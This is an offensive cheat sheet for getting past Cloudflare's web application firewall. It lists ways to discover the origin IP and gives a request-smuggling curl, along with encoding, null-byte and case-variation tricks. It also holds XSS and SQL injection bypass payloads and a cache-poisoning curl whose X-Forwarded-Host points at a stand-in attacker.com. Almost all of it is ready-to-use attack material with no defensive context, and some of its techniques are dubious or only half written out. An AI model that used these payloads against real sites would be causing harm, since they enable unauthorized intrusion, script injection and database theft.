# Cloudflare Bypass Techniques

## 1. Origin IP Discovery
```bash
# DNS history
dig +short target.com
# Shodan
shodan hostname:target.com
# Censys
censys search target.com
# SecurityTrails
# Certificate Transparency
crt.sh
# MX records
dig MX target.com
# SPF records
dig TXT target.com
# Subdomains
subfinder -d target.com | httpx -silent
```

## 2. Cloudflare IP Ranges
```bash
# Bypass Cloudflare by finding origin IP
# Check DNS history services
# Check web archives
# Check email headers
```

## 3. HTTP/2 Bypass
```bash
curl -sk --http2 "http://target/" -H "X-Forwarded-For: origin_ip"
```

## 4. Chunked Transfer Encoding
```bash
curl -sk -X POST "http://target/" -H "Transfer-Encoding: chunked" -d "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n"
```

## 5. Unicode/UTF-8 Bypass
```bash
# URL encoding
%2e%2e%2f -> ../
%252e%252e%252f -> ../
# Unicode normalization
%C0%AE%C0%AE/ -> ../
```

## 6. Case Variation
```bash
# Cloudflare may be case-sensitive
/admin -> /Admin -> /ADMIN
```

## 7. HTTP Parameter Pollution
```
?id=1&id=2
?id=1%26id=2
```

## 8. Null Byte
```
/admin%00
/admin%00.
```

## 9. Double Encoding
```
%252e%252e%252f -> ../
%2525 -> %
```

## 10. WAF Rule Bypass — XSS
```html
<!-- Cloudflare XSS bypasses -->
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">click</a>
<script/src=data:,alert(1)>
```

## 11. WAF Rule Bypass — SQLi
```sql
' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
' %55NION %53ELECT 1,2,3-- -
' UNION%0ASELECT 1,2,3-- -
' UNION ALL SELECT 1,2,3-- -
```

## 12. HTTP Method Bypass
```bash
# If Cloudflare blocks GET, try POST
curl -sk -X POST "http://target/admin"
# Or PUT, PATCH, DELETE
```

## 13. WebSocket Bypass
```javascript
// If WebSocket allowed through Cloudflare
var ws = new WebSocket("ws://target/api");
ws.send(JSON.stringify({query: "admin"}));
```

## 14. Protocol Bypass
```bash
# Try different protocols
http://target
https://target
# If Cloudflare only protects HTTPS
```

## 15. Cache Poisoning
```bash
# X-Forwarded-Host
curl -sk "http://target/" -H "X-Forwarded-Host: attacker.com"
```

## Tools
```bash
# CloudFlair
python3 cloudflair.py target.com
# HatCloud
ruby hatcloud.rb -b target.com
# CrimeFlare
python3 crimeflare.py target.com
```
